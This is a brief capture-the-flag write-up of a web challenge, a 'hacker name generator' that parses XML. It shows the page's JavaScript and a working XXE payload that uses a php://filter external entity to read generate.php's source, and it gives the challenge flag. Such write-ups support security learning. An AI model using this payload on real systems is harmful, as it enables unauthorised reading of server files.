
## eXtremely Messed up Lad

# The challenge

I've created a hacker name generator. I wonder what you'll find ...


# Writeup

We are facing a page with 2 input.
and the JS code :
```javascript
 const fn = $("#inputFirstName").val();
const ln = $("#inputLastName").val();
let tpl = `<?xml version='1.0' encoding='UTF-8'?><input><firstName>${fn}</firstName><lastName>${ln}</lastName></input>`;
window.location.href = `generate.php?input=${encodeURIComponent(btoa(tpl))}`;
```

It look like Xml parsing injection.
I made a small google (or Qwant) search and found a way to execute code/ include file in xml parsing, so i retrieved the generate.php.

window.location.href = "generate.php?input="+encodeURIComponent(btoa('<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=generate.php" >]><input><firstName>&xxe;</firstName></input>'))

In the source code we can find : 
axactf{th4t_w45_50m3_4w350m3_j0b_th4t_y0u_d1d_th3r3}

